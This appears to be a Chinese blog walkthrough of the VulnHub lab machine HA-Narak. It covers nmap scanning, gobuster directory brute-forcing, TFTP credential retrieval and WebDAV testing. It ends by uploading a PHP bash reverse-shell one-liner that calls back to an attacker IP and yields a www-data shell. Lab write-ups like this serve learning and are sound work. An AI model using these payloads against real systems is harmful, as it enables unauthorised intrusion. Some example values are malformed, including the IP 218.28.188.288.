---
title: vulnhub刷题记录
date: 2023-04-18 21:54:56
tags: 
- vulnhub
categories: vulnhub
keywords: vulnhub
description: 本文记录了作者在刷CTF的Web方向题目中面临的问题以及解决方案
top_img: https://raw.githubusercontent.com/Catsofsuffering/PicGoBed/main/logo.png
cover: https://raw.githubusercontent.com/Catsofsuffering/PicGoBed/main/last_stand__commission__by_themefinland_dazds52-fullview.jpg
password: xdxdsqyc15511551
message: 暂未完成，仍在施工
---

## HA-Narak

### 信息搜集

将靶机导入 VM ，然后用侦测靶机 IP 地址

``` bash
sudo nmap -sn --min-rate 10000 192.168.xxx.0/24
```

这段命令的含义是：

- `-sn` 不进行端口扫描，只进行主机发现，即判断目标网段中哪些主机是存活的，
- `–min-rate 10000` 设置扫描的最小速率为10000个数据包每秒，可以提高扫描效率，但也可能导致丢包或误报。
- `192.168.xxx.0/24` 指定目标网段为192.168.xxx.0/24，即192.168.xxx.0到192.168.xxx.255共256个IP地址。

靶机打开前后进行两次扫描，从而可以通过对比确定靶机地址。

确定靶机之后，对靶机进行探测：

``` bash
sudo nmap -sT -p- --min-rate 10000 192.168.xxx.132
```

该命令的含义是：

- `-sT`：使用 TCP connect 扫描，即完成TCP的三次握手阶段进行扫描，可以判断目标主机开放了哪些端口。
- `-p-`：指定扫描所有端口，即从1到65535共65535个端口，这样可以避免遗漏一些不常见的端口。

``` bash
sudo nmap -sT -sV -sC -v -O -p22,80 --min-rate 10000 192.168.xxx.132 -oA narakDetails
```

扫描结果如下：

![扫描结果](https://raw.githubusercontent.com/Catsofsuffering/PicGoBed/main/20230418223057.png)

该命令的含义是：

- `-sV` ：探测目标主机开放端口的服务版本信息，可以获取更多的细节，如软件名称、版本号等。
- `-sC` ：使用默认的Nmap Scripting Engine (NSE)脚本进行扫描，可以执行一些常见的安全检测和漏洞利用等。
- `-v` ：增加输出的详细程度，显示更多的运行时信息和警告。
- `-O` ：尝试探测目标主机的操作系统类型和版本，需要有root权限才能执行。
- `-p22,80` ：指定只扫描22和80两个端口，可以节省时间和资源。
- `-oA narakDetails` ：指定输出结果的格式为三种（普通、XML、grepable）并保存到以narakDetails为前缀的文件中。

扫描结果如下：

![扫描结果](https://raw.githubusercontent.com/Catsofsuffering/PicGoBed/main/KK_CKOL090%60H%7EAD%251MNIAJI.png)

接着用UDP协议进行探测：

``` bash
sudo nmap -sU --top-port 20 --min-rate 10000 192.168.xxx.132
```

根据搜索结果，sudo nmap -sU --top-port 20 --min-rate 10000 192.168.118.132是一个使用nmap工具进行网络扫描的命令¹。该命令的含义是：

- `-sU` ：使用UDP扫描，即发送UDP数据包到目标主机的端口，根据响应判断端口是否开放。
- `--top-port 20` ：指定扫描最常见的20个端口，可以节省时间和资源。

扫描结果如图所示：

![UDP扫描结果](https://raw.githubusercontent.com/Catsofsuffering/PicGoBed/main/20230418232202.png)

从 UDP 扫描结果可以发现，靶机似乎存在 TFTP 服务，但是目前没有利用点，继续向下走。

{% hideToggle TFTP 服务,orange, %}
TFTP是**简单文件传输协议**（Trivial File Transfer Protocol）的缩写，它是一种用来在客户机和服务器之间进行简单文件传输的协议。它提供不复杂、开销不大的文件传输服务，使用UDP协议在端口号69建立网络连接。它的一个主要用途是在局域网中的节点启动时进行文件传输。TFTP不需要用户登录，也不支持重命名或删除文件。TFTP通常只适用于局域网使用，因为它没有安全或保密机制。

使用TFTP传输文件需要有一个TFTP客户端和一个TFTP服务器。TFTP客户端可以用命令行或图形界面的方式操作，TFTP服务器需要安装和配置相应的软件。不同的操作系统有不同的方法，这里以Linux和Windows为例。

在Linux系统中，可以使用tftp命令来传输文件。tftp命令的语法是：

``` bash
tftp [主机名称或IP地址]
```

例如，要连接到远程服务器218.28.188.288，可以输入：

``` bash
tftp 218.28.188.288
```

连接成功后，可以使用以下命令来传输文件：

- put：上传文件到服务器
- get：从服务器下载文件
- quit：退出tftp
- help：显示帮助信息

例如，要从服务器下载根目录下的文件README，可以输入：

``` bash
get README
```

在Windows系统中，需要先开启TFTP客户端的功能，方法是：

- 打开控制台，点击应用程序。
- 在“应用程序与功能”窗口，往下滑到底部点击“程序和功能->开启与关闭Windows功能”。
- 在“Windows功能”窗口中，勾选“TFTP客户端”，可能需要重新启动电脑才能完成设置。

开启后，可以在命令提示符中输入tftp命令来传输文件。tftp命令的语法是：

``` bash
tftp -p -l 本地文件路径 服务器IP地址（上传文件）
tftp -g -r 服务器文件路径 服务器IP地址（下载文件）
```

例如，要上传本地文件 `c:\\User\\Administrator\\Download` 到服务器 `1.2.3.4` ，可以输入：

``` bash
tftp -p -l c:\\User\\Administrator\\Download 1.2.3.4
```

要从服务器下载文件data.txt到当前目录，可以输入：

``` bash
tftp -g -r data.txt 1.2.3.4
```

{% endhideToggle %}

之后用 gobuster 爆破目录，字典用的 dirbuster 带的字典，~~属实是NTR了。~~

``` bash
sudo gobuster dir -u 192.168.xxx.132 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

![gobuster爆破结果](https://raw.githubusercontent.com/Catsofsuffering/PicGoBed/main/20230418225911.png)

发现 webdav 服务，`http://192.168.xxx.132/webdav`

![Webdav服务](https://raw.githubusercontent.com/Catsofsuffering/PicGoBed/main/20230418230149.png)

{% hideToggle 什么是 Webdav 服务,orange, %}
Webdav 服务是一种基于 HTTP 协议的文件共享服务，它可以让应用程序直接对 Web 服务器进行读写操作，并支持文件的锁定和版本控制。Webdav 服务的应用场景有：

- 在不同的设备和平台上同步和备份文件，如使用坚果云、 OneDrive 等支持 Webdav 协议的网盘。
- 在移动端访问和编辑云端的文档、笔记、日程等，如使用 iWork、GoodReader 、Notability 等支持 Webdav 协议的应用。
- 在远程服务器上管理和传输文件，如使用 RaiDrive 、WinSCP 等支持 Webdav 协议的工具。

要使用 Webdav 服务，需要有一个 Webdav 客户端和一个 Webdav 服务器。 Webdav 客户端可以是浏览器、文件管理器、应用程序等，Webdav 服务器可以是网盘、NAS 、VPS 等。要建立连接，需要知道服务器的**地址、端口、用户名和密码**。连接成功后，就可以像操作本地文件一样操作远程文件了。

要搭建一个 Webdav 服务器，可以使用 Windows 自带的 IIS 服务，也可以使用 Apache 、Nginx 等开源软件，或者使用专门的 Webdav 软件。

webdav服务漏洞是指一些利用webdav服务的特性或者缺陷来进行攻击的漏洞。webdav是一种基于HTTP协议的文件管理协议，允许用户通过web服务器来创建、修改、删除和移动文件。webdav服务漏洞的类型和影响有：

- webdav 目录遍历漏洞：利用 webdav 服务对 URL 解码的不完整性，可以绕过目录限制，访问或者修改任意文件，甚至执行任意代码。
- webdav PUT 方法漏洞：利用 webdav 服务支持的 PUT 方法，可以上传任意文件到 web 服务器上，如果没有正确的权限控制和过滤，可能导致任意代码执行或者信息泄露。
- webdav PROPFIND 方法漏洞：利用 webdav 服务支持的 PROPFIND 方法，可以获取 web 服务器上的文件和目录信息，如果没有正确的权限控制和过滤，可能导致信息泄露或者拒绝服务。
- webdav NTLM 认证绕过漏洞：利用 webdav 服务对 NTLM 认证的不正确处理，可以绕过身份验证，访问或者修改受保护的资源。
{% endhideToggle %}

{% note danger %}
注意：gobuster 默认不扫描 `zip` , `rar` , `sql` , `txt` 文件，因此需要用 `-x` 参数指定
{% endnote %}

``` bash
sudo gobuster dir -u 192.168.118.132 -x zip,rar,sql,txt -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

又发现 `http://192.168.xxx.132/tips.txt` ，提示为：“Hint to open the door of narak can be found in creds.txt.”

尝试访问一下：`http://192.168.xxx.132/creds.txt` ，然而并没能请求到该文件，说明这条路走不通。

接下来试试前文提到的 TFTP 服务：

``` bash
tftp 192.168.xxx.132
get creds.txt
```

欸，居然成功了。打开文件观察一下，发现是 base64 编码的，解码后返回一对账号密码：

![账号密码](https://raw.githubusercontent.com/Catsofsuffering/PicGoBed/main/20230419090129.png)

登录 Webdav ，结果发现没有任何可利用的文件，想到能不能写入文件，从 kali 的工具手册找到 Devtest 工具。

{% blockquote Kali Docs https://www.kali.org/tools/davtest/ %}
DAVTest tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target. It is meant for penetration testers to quickly and easily determine if enabled DAV services are exploitable.
{% endblockquote %}

Devtest 这个工具就是用来测试 WebDAV 有哪些文件允许上传，并且能够上传 shell 文件。

``` bash
sudo davtest -auth yamdoot:Swarg -cleanup -url http://192.168.118.132/webdav
```

测试结果如下：

![davtest 测试结果](https://raw.githubusercontent.com/Catsofsuffering/PicGoBed/main/20230419095443.png)

可以看到，php文件师是能够执行的，这里可以直接写入 webshell 用工具连接，也可以写入一句话反弹 shell 。此处选择后者：

``` php
<?php exec("\bin\bash -c 'bash -i >& /dev/tcp/192.168.xxx.130/ 0>&1'");?>
```

{% blockquote Kali Docs https://www.kali.org/tools/cadaver/%}
cadaver supports file upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking.

Its operation is similar to the standard BSD ftp(1) client and the Samba Project’s smbclient(1).

This package includes GnuTLS (HTTPS) support.

WebDAV (Web-based Distributed Authoring and Versioning) is a set of extensions to the HTTP protocol which allow users to collaboratively edit and manage files on remote web servers.
{% endblockquote %}

cadaver 是一个可以用来访问和编辑web服务器上的文件的工具，kali 系统中默认装有此软件，因此用 cadaver 通过之前活得的用户名与密码，写入 `shell.php` 上传，使用 nc 监听端口，然后请求 `http://192.168.xxx.132/webdav/shell.php`：

``` bash
echo "<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.xxx.130/2333 0>&1'");?>" > shell.php
cadave http://192.168.xxx.132 # then enter User ID and passwd
put /path/to/shell.php
nc -lvvp 2333
```

可以看到已经回弹 shell 了，是 `www-data` 用户